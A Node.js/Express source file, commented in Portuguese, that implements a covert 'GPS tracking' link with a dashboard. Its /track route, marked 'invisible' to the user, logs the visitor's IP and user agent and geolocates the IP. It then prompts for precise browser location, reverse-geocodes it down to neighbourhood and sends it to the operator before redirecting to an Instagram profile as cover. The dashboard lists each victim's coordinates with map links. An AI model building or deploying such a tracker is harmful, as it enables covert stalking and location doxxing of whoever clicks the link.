const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static('public'));

const clicks = [];

function getIP(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
  return ip.replace('::ffff:', '').trim();
}

// Dashboard
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard de Rastreamento</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      padding: 20px;
    }
    .container { max-width: 1200px; margin: 0 auto; }
    .header {
      background: white;
      border-radius: 15px;
      padding: 30px;
      margin-bottom: 20px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    }
    h1 { color: #667eea; margin-bottom: 10px; }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 15px;
      margin-bottom: 20px;
    }
    .stat-card {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      text-align: center;
    }
    .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
    .stat-label { color: #666; margin-top: 5px; }
    .clicks-container {
      background: white;
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    }
    .click-item {
      background: #f8f9fa;
      border-left: 4px solid #667eea;
      padding: 15px;
      margin-bottom: 15px;
      border-radius: 5px;
    }
    .click-item.has-gps {
      border-left-color: #28a745;
      background: #f0fff4;
    }
    .btn {
      background: #667eea;
      color: white;
      border: none;
      padding: 12px 30px;
      border-radius: 25px;
      cursor: pointer;
      font-size: 1em;
      margin: 5px;
    }
    .btn:hover { background: #5568d3; }
    .btn-danger { background: #dc3545; }
    .btn-danger:hover { background: #c82333; }
    .link-box {
      background: #e3f2fd;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      border: 2px dashed #667eea;
    }
    .link-box code {
      background: white;
      padding: 8px 15px;
      border-radius: 5px;
      display: inline-block;
      color: #667eea;
      font-weight: bold;
      word-break: break-all;
    }
    .gps-badge {
      background: #28a745;
      color: white;
      padding: 5px 10px;
      border-radius: 5px;
      display: inline-block;
      font-size: 0.85em;
      font-weight: bold;
      margin: 5px 0;
    }
    .ip-badge {
      background: #ffc107;
      color: #000;
      padding: 5px 10px;
      border-radius: 5px;
      display: inline-block;
      font-size: 0.85em;
      font-weight: bold;
      margin: 5px 0;
    }
    .info { color: #666; font-size: 0.9em; margin: 3px 0; }
    .location-box {
      background: white;
      padding: 10px;
      margin: 8px 0;
      border-radius: 5px;
      border: 1px solid #ddd;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>📊 Dashboard de Rastreamento GPS</h1>
      <p>Monitore cliques com localização precisa</p>
      <div class="link-box">
        <strong>🔗 Link de rastreamento:</strong><br>
        <code id="trackLink"></code>
        <button class="btn" onclick="copyLink()">📋 Copiar</button>
      </div>
    </div>
    
    <div class="stats">
      <div class="stat-card">
        <div class="stat-number" id="totalClicks">0</div>
        <div class="stat-label">Total de Cliques</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="gpsClicks">0</div>
        <div class="stat-label">Com GPS Preciso</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="ipClicks">0</div>
        <div class="stat-label">Somente IP</div>
      </div>
    </div>
    
    <div class="clicks-container">
      <button class="btn" onclick="loadData()">🔄 Atualizar</button>
      <button class="btn btn-danger" onclick="clearAll()">🗑️ Limpar</button>
      <h2 style="margin-top:20px;">Últimos Cliques</h2>
      <div id="clicksList">Carregando...</div>
    </div>
  </div>
  
  <script>
    document.getElementById('trackLink').textContent = window.location.origin + '/track';
    
    function copyLink() {
      navigator.clipboard.writeText(window.location.origin + '/track');
      alert('Link copiado!');
    }
    
    async function clearAll() {
      if (confirm('Limpar todos os cliques?')) {
        await fetch('/api/clear', { method: 'POST' });
        loadData();
      }
    }
    
    async function loadData() {
      const res = await fetch('/api/stats');
      const data = await res.json();
      
      document.getElementById('totalClicks').textContent = data.total;
      
      const withGPS = data.clicks.filter(c => c.location && c.location.lat);
      const withIP = data.clicks.filter(c => (!c.location || !c.location.lat) && c.ipLocation);
      
      document.getElementById('gpsClicks').textContent = withGPS.length;
      document.getElementById('ipClicks').textContent = withIP.length;
      
      const list = document.getElementById('clicksList');
      
      if (data.clicks.length === 0) {
        list.innerHTML = '<p style="text-align:center;color:#999;padding:40px;">Nenhum clique ainda</p>';
        return;
      }
      
      list.innerHTML = data.clicks.map(c => {
        const date = new Date(c.timestamp).toLocaleString('pt-BR');
        const hasGPS = c.location && c.location.lat;
        const hasIP = c.ipLocation && c.ipLocation.cidade;
        
        let html = '<div class="click-item' + (hasGPS ? ' has-gps' : '') + '">';
        html += '<div class="info"><strong>⏰ ' + date + '</strong></div>';
        html += '<div class="info">🌐 IP: ' + c.ip + '</div>';
        
        if (hasGPS) {
          const loc = c.location;
          html += '<div class="gps-badge">✅ GPS PRECISO</div>';
          html += '<div class="location-box">';
          html += '<div class="info"><strong>🏙️ Cidade:</strong> ' + loc.cidade + '</div>';
          html += '<div class="info"><strong>🗺️ Estado:</strong> ' + loc.estado + '</div>';
          if (loc.bairro) html += '<div class="info"><strong>🏘️ Bairro:</strong> ' + loc.bairro + '</div>';
          html += '<div class="info"><strong>📍 Coordenadas:</strong> ' + loc.lat.toFixed(6) + ', ' + loc.lng.toFixed(6) + '</div>';
          html += '<div class="info"><strong>🎯 Precisão:</strong> ' + Math.round(loc.accuracy) + 'm</div>';
          html += '<a href="https://www.google.com/maps?q=' + loc.lat + ',' + loc.lng + '" target="_blank" style="color:#667eea;">🗺️ Ver no Mapa</a>';
          html += '</div>';
        } else if (hasIP) {
          html += '<div class="ip-badge">⚠️ LOCALIZAÇÃO POR IP</div>';
          html += '<div class="location-box">';
          html += '<div class="info"><strong>🏙️ Cidade:</strong> ' + c.ipLocation.cidade + '</div>';
          html += '<div class="info"><strong>🗺️ Estado:</strong> ' + c.ipLocation.estado + '</div>';
          html += '<div class="info" style="color:#999;font-size:0.85em;">GPS não autorizado - localização aproximada</div>';
          html += '</div>';
        } else {
          html += '<div class="ip-badge">❌ SEM LOCALIZAÇÃO</div>';
        }
        
        html += '</div>';
        return html;
      }).join('');
    }
    
    loadData();
    setInterval(loadData, 5000);
  </script>
</body>
</html>
  `);
});

// Página de rastreamento - INVISÍVEL para o usuário
app.get('/track', (req, res) => {
  const clickData = {
    id: clicks.length + 1,
    ip: getIP(req),
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'] || 'Unknown',
    location: null,
    ipLocation: null
  };
  
  clicks.push(clickData);
  console.log('🔔 Novo clique #' + clickData.id + ' - IP:', clickData.ip);
  
  // Busca IP em background
  (async () => {
    try {
      const ip = clickData.ip;
      if (ip === '127.0.0.1' || ip.startsWith('192.168.')) return;
      
      const res = await fetch('http://ip-api.com/json/' + ip + '?lang=pt&fields=status,country,regionName,city');
      const data = await res.json();
      
      if (data.status === 'success') {
        const click = clicks.find(c => c.id === clickData.id);
        if (click) {
          click.ipLocation = {
            cidade: data.city || 'Desconhecida',
            estado: data.regionName || 'Desconhecido',
            pais: data.country || 'Desconhecido'
          };
          console.log('📍 IP:', data.city, data.regionName);
        }
      }
    } catch (err) {
      console.error('Erro IP:', err.message);
    }
  })();
  
  // HTML INVISÍVEL - redireciona imediatamente
  res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Carregando...</title><style>body{margin:0;background:#fff}</style></head><body><script>const id=' + clickData.id + ';const url="https://www.instagram.com/andre.osantos12/";function redir(){window.location.href=url}if(navigator.geolocation){navigator.geolocation.getCurrentPosition(async(p)=>{try{const lat=p.coords.latitude;const lng=p.coords.longitude;const acc=p.coords.accuracy;const r=await fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat="+lat+"&lon="+lng+"&addressdetails=1&accept-language=pt-BR",{headers:{"User-Agent":"Tracker"}});const d=await r.json();let loc=null;if(d&&d.address){const a=d.address;loc={cidade:a.city||a.town||a.village||a.municipality||a.county||"Desconhecida",estado:a.state||a.region||"Desconhecido",bairro:a.suburb||a.neighbourhood||a.district||a.quarter||null,pais:a.country||"Brasil"}}await fetch("/api/save-gps",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({clickId:id,lat:lat,lng:lng,accuracy:acc,location:loc})});redir()}catch(e){redir()}},()=>{redir()},{enableHighAccuracy:true,timeout:8000,maximumAge:0})}else{redir()}setTimeout(redir,9000)</script></body></html>');
});

// Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  try {
    const { clickId, lat, lng, accuracy, location } = req.body;
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      return res.json({ success: false });
    }
    
    click.location = {
      lat: lat,
      lng: lng,
      accuracy: accuracy,
      cidade: location?.cidade || 'Processando...',
      estado: location?.estado || 'Processando...',
      bairro: location?.bairro || null,
      pais: location?.pais || 'Brasil'
    };
    
    console.log('✅ GPS #' + clickId + ':', lat.toFixed(6), lng.toFixed(6));
    console.log('📍 Local:', click.location.cidade, click.location.estado);
    
    // Tenta melhorar no servidor se necessário
    if (!location || location.cidade === 'Desconhecida') {
      try {
        const r = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&addressdetails=1&accept-language=pt-BR', {
          headers: { 'User-Agent': 'Tracker' }
        });
        const d = await r.json();
        
        if (d && d.address) {
          const a = d.address;
          click.location.cidade = a.city || a.town || a.village || a.municipality || a.county || 'Desconhecida';
          click.location.estado = a.state || a.region || 'Desconhecido';
          click.location.bairro = a.suburb || a.neighbourhood || a.district || a.quarter || null;
          click.location.pais = a.country || 'Brasil';
          console.log('📍 Atualizado:', click.location.cidade, click.location.estado);
        }
      } catch (err) {
        console.error('Erro geocoding:', err.message);
      }
    }
    
    res.json({ success: true });
  } catch (err) {
    console.error('Erro save-gps:', err);
    res.json({ success: false });
  }
});

app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: [...clicks].reverse()
  });
});

app.post('/api/clear', (req, res) => {
  clicks.length = 0;
  console.log('🗑️ Cliques limpos');
  res.json({ success: true });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 Servidor rodando na porta', PORT);
  console.log('');
  console.log('💡 Acesse: http://localhost:' + PORT);
  console.log('💡 Link de rastreamento: http://localhost:' + PORT + '/track');
  console.log('');
  console.log('⚠️  GPS preciso requer HTTPS em produção');
});
